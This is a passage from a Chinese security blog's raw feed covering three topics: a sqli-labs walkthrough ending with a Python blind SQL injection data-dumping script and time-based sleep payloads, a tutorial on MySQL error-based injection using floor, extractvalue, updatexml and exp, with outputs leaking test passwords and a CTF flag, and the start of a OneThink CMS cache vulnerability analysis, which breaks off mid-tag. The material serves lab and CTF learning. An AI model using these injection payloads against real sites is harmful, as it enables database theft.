selectColumnCountPayload</span><br><span class="line"># 获取指定表的列的数量</span><br><span class="line">columnCount &#x3D; getLengthOfString(selectColumnCountPayload, getTable)</span><br><span class="line">print &quot;table:&quot; + getTable + &quot; --count of column:&quot; + str(columnCount)</span><br><span class="line"> </span><br><span class="line"># 获取该表有多少行数据</span><br><span class="line">dataCountPayload &#x3D; &quot;&#39;and (select count(*) from %s)&gt;&#x3D;%d #&quot;</span><br><span class="line">dataCount &#x3D; getLengthOfString(dataCountPayload, getTable)</span><br><span class="line">print &quot;table:&quot; + getTable + &quot; --count of data: &quot; + str(dataCount)</span><br><span class="line"> </span><br><span class="line">data &#x3D; []</span><br><span class="line"># 获取指定表中的列</span><br><span class="line">for i in xrange(0,columnCount):</span><br><span class="line"># 获取该列名字长度</span><br><span class="line">selectColumnNameLengthPayload &#x3D; &quot;&#39;and (select length(column_name) from information_schema.columns where table_schema&#x3D;&#39;&quot;+ DBname +&quot;&#39; and table_name&#x3D;&#39;%s&#39; limit &quot;+ str(i) +&quot;,1)&gt;&#x3D;%d #&quot;</span><br><span class="line"># print selectColumnNameLengthPayload</span><br><span class="line">columnNameLength &#x3D; getLengthOfString(selectColumnNameLengthPayload, getTable)</span><br><span class="line">print &quot;current column length:&quot; + str(columnNameLength)</span><br><span class="line"># 获取该列的名字</span><br><span class="line">selectColumn &#x3D; &quot;select column_name from information_schema.columns where table_schema&#x3D;&#39;&quot;+ DBname +&quot;&#39; and table_name&#x3D;&#39;%s&#39; limit %d,1&quot;</span><br><span class="line">selectColumnName &#x3D; selectColumn%(getTable, i)</span><br><span class="line"># print selectColumnName</span><br><span class="line">columnName &#x3D; getName(asciiPayload, selectColumnName ,columnNameLength)</span><br><span class="line">print columnName</span><br><span class="line"> </span><br><span class="line">tmpData &#x3D; []</span><br><span class="line">tmpData.append(columnName)</span><br><span class="line"># 获取该表的数据</span><br><span class="line">for j in xrange(0,dataCount):</span><br><span class="line">columnDataLengthPayload &#x3D; &quot;&#39;and (select length(&quot;+ columnName +&quot;) from %s limit &quot; + str(j) + &quot;,1)&gt;&#x3D;%d #&quot;</span><br><span class="line"># print columnDataLengthPayload</span><br><span class="line">columnDataLength &#x3D; getLengthOfString(columnDataLengthPayload, getTable)</span><br><span class="line"># print columnDataLength</span><br><span class="line">selectData &#x3D; &quot;select &quot; + columnName + &quot; from users limit &quot; + str(j) + &quot;,1&quot;</span><br><span class="line">columnData &#x3D; getName(asciiPayload, selectData, columnDataLength)</span><br><span class="line"># print columnData</span><br><span class="line">tmpData.append(columnData)</span><br><span class="line"></span><br><span class="line">data.append(tmpData)</span><br><span class="line"> </span><br><span class="line"># print data</span><br><span class="line"># 格式化输出数据</span><br><span class="line"># 输出列名</span><br><span class="line">tmp &#x3D; &quot;&quot;</span><br><span class="line">for i in xrange(0,len(data)):</span><br><span class="line">tmp +&#x3D; data[i][0] + &quot;&quot;</span><br><span class="line">print tmp</span><br><span class="line"># 输出具体数据</span><br><span class="line">for j in xrange(1,dataCount+1):</span><br><span class="line">tmp &#x3D; &quot;&quot;</span><br><span class="line">for i in xrange(0,len(data)):</span><br><span class="line">tmp +&#x3D; data[i][j] + &quot;&quot;</span><br><span class="line">print tmp</span><br><span class="line"></span><br><span class="line"># 获取字符串的长度</span><br><span class="line">def getLengthOfString(payload, string):</span><br><span class="line"># 猜长度</span><br><span class="line">lengthLeft &#x3D; 0</span><br><span class="line">lengthRigth &#x3D; 0</span><br><span class="line">guess &#x3D; 10</span><br><span class="line"># 确定长度上限，每次增加5</span><br><span class="line">while 1:</span><br><span class="line"># 如果长度大于guess</span><br><span class="line">if getLengthResult(payload, string, guess) &#x3D;&#x3D; True:</span><br><span class="line"># 猜测值增加5</span><br><span class="line">guess &#x3D; guess + 5</span><br><span class="line">else:</span><br><span class="line">lengthRigth &#x3D; guess</span><br><span class="line">break</span><br><span class="line"># print &quot;lengthRigth: &quot; + str(lengthRigth)</span><br><span class="line"># 二分法查长度</span><br><span class="line">mid &#x3D; (lengthLeft + lengthRigth) &#x2F; 2</span><br><span class="line">while lengthLeft &lt; lengthRigth - 1:</span><br><span class="line"># 如果长度大于等于mid </span><br><span class="line">if getLengthResult(payload, string, mid) &#x3D;&#x3D; True:</span><br><span class="line"># 更新长度的左边界为mid</span><br><span class="line">lengthLeft &#x3D; mid</span><br><span class="line">else: </span><br><span class="line"># 否则就是长度小于mid</span><br><span class="line"># 更新长度的右边界为mid</span><br><span class="line">lengthRigth &#x3D; mid</span><br><span class="line"># 更新中值</span><br><span class="line">mid &#x3D; (lengthLeft + lengthRigth) &#x2F; 2</span><br><span class="line"># print lengthLeft, lengthRigth</span><br><span class="line"># 因为lengthLeft当长度大于等于mid时更新为mid，而lengthRigth是当长度小于mid时更新为mid</span><br><span class="line"># 所以长度区间：大于等于 lengthLeft，小于lengthRigth</span><br><span class="line"># 而循环条件是 lengthLeft &lt; lengthRigth - 1，退出循环，lengthLeft就是所求长度</span><br><span class="line"># 如循环到最后一步 lengthLeft &#x3D; 8， lengthRigth &#x3D; 9时，循环退出，区间为8&lt;&#x3D;length&lt;9,length就肯定等于8</span><br><span class="line">return lengthLeft</span><br><span class="line"> </span><br><span class="line"># 获取名称</span><br><span class="line">def getName(payload, string, lengthOfString):</span><br><span class="line"># 32是空格，是第一个可显示的字符，127是delete，最后一个字符</span><br><span class="line">tmp &#x3D; &#39;&#39;</span><br><span class="line">for i in xrange(1,lengthOfString+1):</span><br><span class="line">left &#x3D; 32 </span><br><span class="line">right &#x3D; 127</span><br><span class="line">mid &#x3D; (left + right) &#x2F; 2</span><br><span class="line">while left &lt; right - 1:</span><br><span class="line"># 如果该字符串的第i个字符的ascii码大于等于mid</span><br><span class="line">if getResult(payload, string, i, mid) &#x3D;&#x3D; True:</span><br><span class="line"># 则更新左边界</span><br><span class="line">left &#x3D; mid</span><br><span class="line">mid &#x3D; (left + right) &#x2F; 2</span><br><span class="line">else:</span><br><span class="line"># 否则该字符串的第i个字符的ascii码小于mid</span><br><span class="line"># 则更新右边界</span><br><span class="line">right &#x3D; mid</span><br><span class="line"># 更新中值</span><br><span class="line">mid &#x3D; (left + right) &#x2F; 2</span><br><span class="line">tmp +&#x3D; chr(left)</span><br><span class="line"># print tmp</span><br><span class="line">return tmp</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">def main():</span><br><span class="line">inject()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180804/G8JBElI4je.png?imageslim" alt="mark"></p><h1 id="less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注"><a href="#less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注" class="headerlink" title="less-9 GET Blind Time based Single Quotes  (基于时间的GET单引号盲注)"></a>less-9 GET Blind Time based Single Quotes  (基于时间的GET单引号盲注)</h1><p>发现无论是<code>id=1</code>还是<code>id=1&#39;</code>,页面结果没有什么变化，这种情况下，一般就是时间盲注了，只能通过演示函数，通过网页是否延时输出，判断sql注入是否成功。</p><pre><code>http://localhost/sqli-labs/Less-9/?id=1&#39; and sleep(5) # </code></pre><p>延时成功，表示发生了错误，说明存在sql注入点。</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5)) %23</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;114, 0, sleep(5)) %23</span><br></pre></td></tr></table></figure><p>判断数据库名的第一个字母为s（ascii为115），判断错误的话是暂停5秒</p><h1 id="less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注"><a href="#less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注" class="headerlink" title="less-10 GET Blind Time based double quotes (基于时间的双引号盲注)"></a>less-10 GET Blind Time based double quotes (基于时间的双引号盲注)</h1><p>闭合条件变为双引号，注意闭合即可，<br>把上面的改成双引号就行</p><p>判断为基于时间的双引号注入</p><pre><code>http://localhost/sqli-labs/Less-10/?id=1&quot; and sleep(5) #</code></pre><p>不再赘述。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/u012763794/article/details/51207833">https://blog.csdn.net/u012763794/article/details/51207833</a><br><a href="https://www.jianshu.com/p/65f05e7cc957">https://www.jianshu.com/p/65f05e7cc957</a></p>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL 报错注入总结</title>
      <link href="/2018/08/03/MySQL%20%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/08/03/MySQL%20%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL-报错注入（Error-Based-Injection）总结"><a href="#MySQL-报错注入（Error-Based-Injection）总结" class="headerlink" title="MySQL 报错注入（Error Based Injection）总结"></a>MySQL 报错注入（Error Based Injection）总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>利用数据库报错来<strong>显示数据</strong>的注入方式经常会在入侵中利用到，这种方法有一点局限性，需要页面有错误回显。</p><p>而MySQL的报错方式很多，以前就接触到很多，最近也是做了一些关于这方面CTF的题目，学习到很多之前遗漏的姿势，故总结一下,以免遗忘。</p><h2 id="报错注入（Error-based-Injection）"><a href="#报错注入（Error-based-Injection）" class="headerlink" title="报错注入（Error based Injection）"></a>报错注入（Error based Injection）</h2><p>MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，如BigInt大数溢出等，由此可以将MySQL报错注入分为以下几类：</p><ul><li>BigInt等数据类型溢出</li><li>xpath语法错误</li><li>count()+rand()+group_by()导致逐渐重复</li><li>空间数据类型函数错误</li></ul><p>很多函数会导致MySQL报错并显示出数据。</p><ul><li>floor()</li><li>extractvalue()</li><li>updatexml()</li><li>exp()</li></ul><h2 id="MySQL-测试数据"><a href="#MySQL-测试数据" class="headerlink" title="MySQL 测试数据"></a>MySQL 测试数据</h2><p>user.sql</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS &#96;user&#96; (</span><br><span class="line">  &#96;id&#96; int(10) NOT NULL, </span><br><span class="line">  &#96;Username&#96; varchar(20) NOT NULL,</span><br><span class="line">  &#96;Age&#96; int(10) NOT NULL,</span><br><span class="line">  &#96;Password&#96; varchar(20) NOT NULL</span><br><span class="line">) ENGINE&#x3D;MyISAM DEFAULT CHARSET&#x3D;latin1;</span><br><span class="line"></span><br><span class="line">INSERT INTO &#96;user&#96; (&#96;id&#96;, &#96;Username&#96;, &#96;Age&#96;, &#96;Password&#96;) VALUES</span><br><span class="line">(1, &#39;olivia&#39;, 18, &#39;slimslim&#39;),</span><br><span class="line">(2, &#39;qingchen&#39;, 18, &#39;meimima123&#39;),</span><br><span class="line">(3, &#39;hack&#39;, 1, &#39;love_pwn&#39;),</span><br><span class="line">(4, &#39;someome&#39;, 3, &#39;p@55w0rd&#39;);</span><br></pre></td></tr></table></figure><h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><h3 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from user where id&#x3D;1 and (select 1 from (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x from user group by x)a);</span><br><span class="line"></span><br><span class="line">简化为：</span><br><span class="line">mysql&gt; SELECT COUNT(*) FROM user GROUP BY FLOOR(RAND(0)*2);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;&lt;group_key&gt;&#39;</span><br></pre></td></tr></table></figure><ul><li>floor：函数只返回整数部分，小数部分舍弃。</li><li>round：函数四舍五入，大于0.5的部分进位，不到则舍弃。</li></ul><p>**<br>语句拆分**</p><blockquote><p>(select 1 from a) //在a上做派生表<br>b=select count(*),x from user group by x //从user里面选取那么的内容和计数的内容<br>name=concat((查询内容),floor(rand(0)*2)) //把查询内容和随机取整数 连接在一起</p></blockquote><h3 id="报错原理"><a href="#报错原理" class="headerlink" title="报错原理"></a>报错原理</h3><p>目前比较常见的几种报错注入的方法都是利用了mysql某些不能称为bug的bug来实现的。</p><p>下面就以 rand() 函数来进行说明。mysql的官方文档中对 rand() 函数有特殊的说明：</p><blockquote><p>RAND() in a WHERE clause is re-evaluated every time the WHERE is executed. You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times. However, you can retrieve rows in random order like this:</p><p>官方文档中的意思是：在where语句中，where每执行一次，rand()函数就会被计算一次。rand()不能作为order by的条件字段，同理也不能作为group by的条件字段。</p></blockquote><p>因此在mysql中，可以构造一个值不确定而有可重复的字段作为group by的条件字段，这是就可以报出类似于<code>Duplicate entry &#39;…&#39; for key &#39;group_key&#39;</code>的错误。</p><p>另外，经过测试<br><code>rand()</code>会随机报错，就是有可能报错，有的时候不会，<br><code>rand(0)</code>肯定会报错，<code>rand(1)</code>则一定不会报错。<br>所以要让他报错的话直接用<code>rand(0)</code></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from user where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from user group by x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;root@localhost1&#39; for key &#39;&lt;group_key&gt;&#39;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where id&#x3D;1 and (select 1 from (select count(*),concat(database(),&#39;|&#39;,floor(rand(0)*2))x from user group by x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;test|1&#39; for key &#39;&lt;group_key&gt;&#39;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where id&#x3D;1 and (select 1 from (select count(*),concat(table_name,floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;global_status0&#39; for key &#39;&lt;group_key&gt;&#39;</span><br></pre></td></tr></table></figure><p>关于更多该语句报错原理的内容，可以参考这篇<a href="http://heartsky.info/2016/12/04/%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%20MySQL%20%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">大佬的文章</a></p><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</p><p>因此在mysql 小于5.1.5中不能用ExtractValue和UpdateXML进行报错注入。</p><h3 id="注入语句-1"><a href="#注入语句-1" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure><h3 id="报错原理-1"><a href="#报错原理-1" class="headerlink" title="报错原理"></a>报错原理</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXTRACTVALUE (XML_document, XPath_string);</span><br></pre></td></tr></table></figure><ul><li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>第二个参数：XPath_string (Xpath格式的字符串).</li><li>作用：从目标XML中返回包含所查询值的字符串</li></ul><p>第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里</p><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from user where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost~&#39;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select database()),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~test~&#39;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;test&#39;),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~user~&#39;</span><br><span class="line"></span><br><span class="line">select * from user where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select group_concat(comlumn_name) from information_schema.columns where table_schema&#x3D;&#39;test&#39; and table_name&#x3D;&#39;user&#39;),00x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~id,Username,Age,Password~&#39;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select concat(id,&#39;|&#39;,Username,&#39;|&#39;,Password) from user where id&#x3D;1),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~1|olivia|slimslim~&#39;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select group_concat(password) from user),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~slimslim,meimima123,love_pwn,p@&#39;</span><br></pre></td></tr></table></figure><p>值得注意的是，extractvalue()报错长度是有限制的,最长32位。（从最后一句测试，也可以看出）</p><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</p><p>因此在mysql 小于5.1.5中不能用ExtractValue和UpdateXML进行报错注入。</p><h3 id="注入语句-2"><a href="#注入语句-2" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure><h3 id="报错原理-2"><a href="#报错原理-2" class="headerlink" title="报错原理"></a>报错原理</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value);</span><br></pre></td></tr></table></figure><ul><li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>第二个参数：XPath_string (Xpath格式的字符串)</li><li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li></ul><p>作用：改变文档中符合条件的节点的值<br>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p><p>其实原理和extractvalue()是一样的，利用Xpath格式字符串不符合要求达到报错的效果，但是不一样的是，updatexml()有<strong>3个参数</strong>，要注意这一点。</p><h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from user where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost~&#39;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where id&#x3D;1 and (updatexml(1,concat(0x7e,(select database()),0x7e),1));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~test~&#39;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where id&#x3D;1 and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;test&#39;),0x7e),1));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~user~&#39;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where id&#x3D;1 and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;test&#39; and table_name&#x3D;&#39;user&#39;),0x7e),1));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~id,Username,Age,Password~&#39;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where id&#x3D;1 and (updatexml(1,concat(0x7e,(select concat(id,&#39;|&#39;,Username,&#39;|&#39;,Password) from user where id&#x3D;1),0x7e),1));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~1|olivia|slimslim~&#39;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where id&#x3D;1 and (updatexml(1,concat(0x7e,(select group_concat(password) from user),0x7e),1));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~slimslim,meimima123,love_pwn,p@&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>值得注意的是，updatexml()和extractvalue()一样，报错长度是有限制的,最长32位。（从最后一句测试，也可以看出）</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h2><p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明out-of-range-and-overflow，只有版本号大于5.5.5时，才会报错。</p><p>利用exp函数也产生类似的溢出错误</p><h3 id="注入语句-3"><a href="#注入语句-3" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select exp(~(select * from(select database())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select &#96;x&#96;.&#96;database()&#96; from (select database() AS &#96;database()&#96;) &#96;x&#96;)))&#39;</span><br></pre></td></tr></table></figure><p>注意，exp()产生错误，但是并没有爆出database()，但是发现database() 是表达式，在脚本语言中会转化为相应的值，从而爆出数据库名。</p><h3 id="报错原理-3"><a href="#报错原理-3" class="headerlink" title="报错原理"></a>报错原理</h3><p>exp是以e为底的指数函数，但是，由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，报错。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</span><br></pre></td></tr></table></figure><p>将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec) </span><br><span class="line"></span><br><span class="line">mysql&gt; select ~(select version());</span><br><span class="line">+----------------------+</span><br><span class="line">| ~(select version())  |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551610 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure><p>我们通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select exp(~(select * from(select database())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select &#96;x&#96;.&#96;database()&#96; from (select database() AS &#96;database()&#96;) &#96;x&#96;)))&#39;</span><br></pre></td></tr></table></figure><p>在脚本语言中，就会将错误中的一些表达式转化成相应的字符串,从而爆出数据。</p><h3 id="测试-3"><a href="#测试-3" class="headerlink" title="测试"></a>测试</h3><p>由于exp()报错的表达式在脚本语言中才会转化为相应的值，下面用<a href="http://ctf5.shiyanbar.com/web/baocuo/index.php">实验吧上一道题目</a>来演示说明exp()报错注入。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;&amp;password&#x3D;&#39; or  exp(~(select * from(select database())x)) or&#39; </span><br><span class="line">DOUBLE value is out of range in &#39;exp(~((select &#39;error_based_hpf&#39; from dual)))&#39;</span><br><span class="line"></span><br><span class="line">username&#x3D;&amp;password&#x3D;&#39; or exp(~(select * from(select group_concat(table_name) from information_schema.tables where !(table_schema &lt;&gt; database()))a)) or &#39;</span><br><span class="line">DOUBLE value is out of range in &#39;exp(~((select &#39;ffll44jj,users&#39; from dual)))&#39;</span><br><span class="line"></span><br><span class="line">username&#x3D;&amp;password&#x3D;&#39; or exp(~(select * from(select group_concat(column_name) from  information_schema.columns where table_name regexp &#39;ffll44jj&#39;)a)) or &#39;</span><br><span class="line">DOUBLE value is out of range in &#39;exp(~((select &#39;value&#39; from dual)))&#39;</span><br><span class="line"></span><br><span class="line">username&#x3D;&amp;password&#x3D;&#39; or exp(~(select * from(select value from  ffll44jj)z)) or &#39; </span><br><span class="line">DOUBLE value is out of range in &#39;exp(~((select &#39;flag&#123;err0r_b4sed_sqli_+_hpf&#125;&#39; from dual)))&#39;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="http://heartsky.info/2016/12/04/%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%20MySQL%20%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">几种常见的 MySQL 报错注入</a></li><li><a href="https://uknowsec.cn/posts/notes/MySQL%20Error%20Based%20SQL%20Injection%20%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89%E6%80%BB%E7%BB%93.html">MySQL Error Based SQL Injection （报错注入）总结</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OneThink CMS 缓存漏洞</title>
      <link href="/2018/08/02/OneThink%20CMS%E7%9A%84%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/"/>
      <url>/2018/08/02/OneThink%20CMS%E7%9A%84%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最早是2018.7.21 i春秋巅峰极客赛接触到这个漏洞，这也是我第一次认真的搭建环境，分析漏洞。跟着大佬的博客，算是比较清楚的弄懂了这个漏洞。</p><h1 id="0x01-漏洞环境"><a href="#0x01-漏洞环境" class="headerlink" title="0x01 漏洞环境"></a>0x01 漏洞环境</h1><ol><li>OneThink 1.0</li><li>/Temp/Runtime目录可读可写</li></ol><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>因为ThinkPHP对缓存设计逻辑的漏洞，以及缓存文件名可猜测的原因，导致了这个漏洞</p><p>先看一下ThinkPHP的缓存文件的配置：</p><p>ThinkPHP中一些系统常量的定义都在ThinkPHP/ThinkPHP.php中定义，缓存路径也在这里：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180802/BGB5db0ikE.png?imageslim" alt="mark"></p><p>发现TEMP_PATH 默认值为<code>RunTime/Temp</code>目录。<br>但是 缓存数据文件存储位置为<code>ThinkPHP/Conf/convention.php</code><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180802/1J83d2l7K6.png?imageslim" alt="mark"></p><p>下面一步步分析 OneThink 在登陆的时候缓存文件是如何存储的：<br>登陆时，请求的网页是<code>http://127.0.0.1/onethink/index.php?s=/Home/User/login.html</code><br>搜索login，在<code>onethink\Application\Admin\Controller\PublicController.class.php</code>下找到对应方法<br>其中的D函数是TP中获取model的方法，这里相当于获得了一个MemberModel类的实例，<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180802/4J1LID34el.png?imageslim" alt="mark"></p><p>登陆成功后，调用Member-&gt;login方法，跳转到定义：<br><code>onethink\Application\Admin\Model\MemberModel.class.php</code><br>其中<code>$uid</code>是从数据库中查询出来的用户名对应的用户id。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180802/I57Jkg8Km9.png?imageslim" alt="mark"></p><p>登陆时，调用autoLogin()函数，继续跟进，找到get_username()函数<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180802/dkF42Kh98A.png?imageslim" alt="mark"></p><p>终于找到了对于用户名的缓存操作</p><p>在第一次登陆的时候是没有缓存的，if条件应该直接进入else部分，又因为$list是从$uid所在行的第二行拿到的，所以应该是用户名，所以在下面调用S方法缓存数据的时候传入的$list我们是可控的</p><p>再进入S函数，查看一下这个函数的具体设计<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180802/D7ggEHe0fH.png?imageslim" alt="mark"></p><p>我们传入的$list就是S函数中的value参数，分析if条件的话可以知道程序直接进入第二个elseif，初始化$cache，关键在最后的set函数，set函数中的$value仍然是我们可控的，进入set函数中，set函数在<code>ThinkPHP/Library/Think/Cache/Driver/File.class.php</code></p><p>发现$filename被file_put_contents直接调用，如果不开启数据压缩的话，$data则是我们控制的$value序列化以后存入的值<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180802/e9l9hma0Dm.png?imageslim" alt="mark"></p><p>下面再知道文件名，就完全可控了，看看文件名是怎么定义的。<br><img 